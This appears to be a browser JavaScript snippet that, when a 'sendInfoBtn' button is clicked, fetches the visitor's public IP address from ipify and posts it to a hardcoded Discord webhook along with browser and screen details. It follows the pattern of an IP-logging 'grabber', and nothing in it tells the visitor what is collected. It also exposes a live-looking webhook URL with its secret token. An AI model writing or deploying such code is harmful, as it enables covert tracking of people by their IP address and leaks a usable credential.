document.getElementById('sendInfoBtn').addEventListener('click', function() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;  

            const systemInfo = {
                "User-Agent": navigator.userAgent,
                "Platform": navigator.platform,
                "Language": navigator.language,
                "Online": navigator.onLine,
                "Cookies Enabled": navigator.cookieEnabled,
                "IP Address": ip, 
                "Screen Resolution": `${window.innerWidth}x${window.innerHeight}`,  
                "Time": new Date().toLocaleString()  
            };

            const webhookUrl = 'https://discord.com/api/webhooks/1329581061209985065/L2pdhnruehhQwHOLtsdDVZxEyvUDNSQ8vTiq5Le8dEfxijfJFOrgjenWCoeHQcbFNEly';

            const message = {
                content: `**System Info (from browser)**\n\`\`\`JSON\n${JSON.stringify(systemInfo, null, 2)}\n\`\`\``
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })

         

          
        })

      
});
